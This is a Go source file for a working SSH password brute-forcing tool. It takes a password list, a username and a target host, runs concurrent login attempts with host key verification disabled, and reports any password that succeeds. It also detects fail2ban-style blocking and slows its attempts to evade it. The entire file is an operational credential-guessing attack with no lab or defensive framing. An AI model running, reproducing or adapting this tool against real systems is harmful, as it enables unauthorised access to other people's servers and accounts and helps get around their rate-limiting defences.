package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	passwordFile = flag.String("p", "", "Password file path (one password per line)")
	username     = flag.String("u", "", "SSH username")
	target       = flag.String("t", "", "Target server address (host:port or host)")
	threads      = flag.Int("n", 1, "Number of concurrent threads (default 1, recommended for SSH)")
	timeout      = flag.Duration("timeout", 5*time.Second, "SSH connection timeout")
	verbose      = flag.Bool("v", false, "Verbose mode (show all attempts)")
	delay        = flag.Duration("d", 5*time.Millisecond, "Delay between connection attempts (use 5s for fail2ban protection)")

	successFlag  int32
	wg           sync.WaitGroup
	mu           sync.Mutex
	connLimiter  = make(chan struct{}, 1) // Limit concurrent connections
	failCount    int32                    // Track consecutive failures
)

func main() {
	flag.Parse()

	// Validate required flags
	if *passwordFile == "" || *username == "" || *target == "" {
		fmt.Fprintf(os.Stderr, "Usage: passwd-crasher -p password.txt -u root -t 192.168.1.1\n")
		fmt.Fprintf(os.Stderr, "Options:\n")
		flag.PrintDefaults()
		os.Exit(1)
	}

	// Normalize target address
	targetAddr := *target
	if len(targetAddr) > 0 && targetAddr[len(targetAddr)-1] != ':' {
		// Check if port is already specified
		hasPort := false
		for i := len(targetAddr) - 1; i >= 0; i-- {
			if targetAddr[i] == ':' {
				hasPort = true
				break
			}
		}
		if !hasPort {
			targetAddr = targetAddr + ":22"
		}
	}

	// Read passwords from file
	passwords, err := readPasswordFile(*passwordFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error reading password file: %v\n", err)
		os.Exit(1)
	}

	if len(passwords) == 0 {
		fmt.Fprintf(os.Stderr, "No passwords found in file\n")
		os.Exit(1)
	}

	fmt.Printf("[*] Starting SSH password cracker\n")
	fmt.Printf("[*] Target: %s\n", targetAddr)
	fmt.Printf("[*] Username: %s\n", *username)
	fmt.Printf("[*] Passwords: %d\n", len(passwords))
	fmt.Printf("[*] Threads: %d\n", *threads)
	fmt.Printf("[*] Timeout: %v\n", *timeout)
	fmt.Printf("[*] Delay between attempts: %v\n", *delay)
	fmt.Printf("[*] Verbose: %v\n\n", *verbose)

	// Test connection first
	fmt.Printf("[*] Testing connection to %s...\n", targetAddr)
	testConn(targetAddr)

	// Setup signal handler for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	// Create password channel
	passwordChan := make(chan string, *threads)

	// Start worker goroutines
	for i := 0; i < *threads; i++ {
		wg.Add(1)
		go worker(i, targetAddr, passwordChan)
	}

	// Send passwords to workers
	go func() {
		for _, pwd := range passwords {
			// Check if any thread succeeded
			if atomic.LoadInt32(&successFlag) != 0 {
				close(passwordChan)
				return
			}
			select {
			case <-sigChan:
				close(passwordChan)
				return
			case passwordChan <- pwd:
			}
		}
		close(passwordChan)
	}()

	// Wait for all workers to finish or signal
	go func() {
		<-sigChan
		atomic.StoreInt32(&successFlag, 1)
	}()

	wg.Wait()

	if atomic.LoadInt32(&successFlag) == 0 {
		fmt.Printf("\n[!] No password found\n")
		os.Exit(1)
	}
}

func readPasswordFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var passwords []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if line != "" {
			passwords = append(passwords, line)
		}
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return passwords, nil
}

func testConn(target string) {
	config := &ssh.ClientConfig{
		User: "test",
		Auth: []ssh.AuthMethod{
			ssh.Password("test"),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         *timeout,
	}

	client, err := ssh.Dial("tcp", target, config)
	if err != nil {
		errStr := err.Error()

		// Check if it's an authentication error (which is good - means server is reachable)
		if strings.Contains(errStr, "unable to authenticate") {
			fmt.Printf("[+] SSH service is reachable and responding!\n")
			fmt.Printf("[+] Ready to start password cracking...\n\n")
			return
		}

		// Other errors indicate connectivity issues
		fmt.Printf("[!] Connection test failed: %v\n", err)
		fmt.Printf("[!] This might indicate:\n")
		fmt.Printf("    - Target server is unreachable\n")
		fmt.Printf("    - Firewall is blocking the connection\n")
		fmt.Printf("    - SSH service is not running on target\n")
		fmt.Printf("    - Network connectivity issue\n\n")
		return
	}
	defer client.Close()
	fmt.Printf("[+] Connection successful! SSH service is reachable.\n\n")
}

func worker(id int, target string, passwordChan chan string) {
	defer wg.Done()

	for password := range passwordChan {
		// Check if already succeeded
		if atomic.LoadInt32(&successFlag) != 0 {
			return
		}

		// Acquire connection slot (limit concurrent connections)
		connLimiter <- struct{}{}

		success, blocked := trySSH(id, target, *username, password)

		if success {
			<-connLimiter
			atomic.StoreInt32(&successFlag, 1)
			fmt.Printf("[+] SUCCESS! Password found: %s\n", password)
			return
		}

		// If blocked by fail2ban, increase delay
		if blocked {
			atomic.AddInt32(&failCount, 1)
			mu.Lock()
			fmt.Printf("[!] Server blocking detected! Increasing delay to 5s\n")
			mu.Unlock()
			<-connLimiter
			time.Sleep(5 * time.Second)
		} else {
			<-connLimiter
			// Add delay between attempts to avoid overwhelming the server
			time.Sleep(*delay)
		}
	}
}

// trySSH returns (success, blocked)
// success: true if password is correct
// blocked: true if server is blocking connections (fail2ban detected)
func trySSH(threadID int, target, username, password string) (bool, bool) {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         *timeout,
	}

	client, err := ssh.Dial("tcp", target, config)
	if err == nil {
		defer client.Close()
		mu.Lock()
		fmt.Printf("[+] Thread %d: SUCCESS! Password: %s\n", threadID, password)
		mu.Unlock()
		return true, false
	}

	errStr := err.Error()

	// Check for specific error types
	if *verbose {
		mu.Lock()
		fmt.Printf("[-] Thread %d: Failed with password '%s': %v\n", threadID, password, errStr)
		mu.Unlock()
	}

	// Check if server is blocking (fail2ban, rate limiting, etc.)
	if strings.Contains(errStr, "connection reset by peer") ||
		strings.Contains(errStr, "Not allowed at this time") ||
		strings.Contains(errStr, "Connection refused") {
		return false, true
	}

	// Check for authentication failure (password wrong) vs connection error
	if strings.Contains(errStr, "unable to authenticate") {
		// This is a password failure, not a connection issue
		if *verbose {
			mu.Lock()
			fmt.Printf("[-] Thread %d: Authentication failed for password '%s'\n", threadID, password)
			mu.Unlock()
		}
		return false, false
	}

	return false, false
}
